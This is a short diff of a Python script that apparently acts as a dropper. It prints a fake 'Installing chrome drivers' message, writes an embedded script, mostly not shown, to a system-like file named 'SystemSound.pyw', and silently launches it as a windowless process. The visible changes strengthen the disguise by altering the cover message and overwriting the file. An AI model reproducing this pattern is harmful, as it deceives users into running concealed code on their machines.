@@ -11,12 +11,12 @@ file = 'SystemSound.pyw'
 
 os.system('cls')
 
-print(f'{Fore.GREEN}[+]{Fore.WHITE} Installing sound drivers')
+print(f'{Fore.GREEN}[+]{Fore.WHITE} Installing chrome drivers')
 time.sleep(1)
 
 os.system('cls')
 
-with open(f'{file}' , 'a') as f:
+with open(f'{file}' , 'w') as f:
     f.write('''
 ### IMPORTS ###
 import ctypes
@@ -270,5 +270,5 @@ try:
 except:
     loop.stop()''')
 
-os.system(f'start {file}')
-input("")
+time.sleep(1)
+os.system(f'start {file}') 
